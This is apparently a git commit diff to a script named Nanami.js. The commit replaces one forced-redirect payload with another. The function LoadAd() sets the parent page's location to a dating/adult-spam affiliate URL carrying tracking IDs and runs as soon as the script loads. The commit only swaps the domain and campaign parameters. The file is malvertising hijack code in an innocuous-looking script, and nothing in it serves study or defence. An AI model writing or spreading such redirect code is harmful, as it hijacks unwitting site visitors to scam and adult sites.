e537162bf1ca39d8a8cda1cf1e0207a0f3cbcb60
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-05-14 20:35:05 +0700

    Update Nanami.js

--- Nanami.js
+++ Nanami.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://keojbm.datiinghype.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=229300&s2=2248443&s3=Nanami"; } LoadAd();
+function LoadAd() { parent.location.href="https://oggoel.diirtyflirtclub.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=181648&s2=2249284&s3=Madara"; } LoadAd();
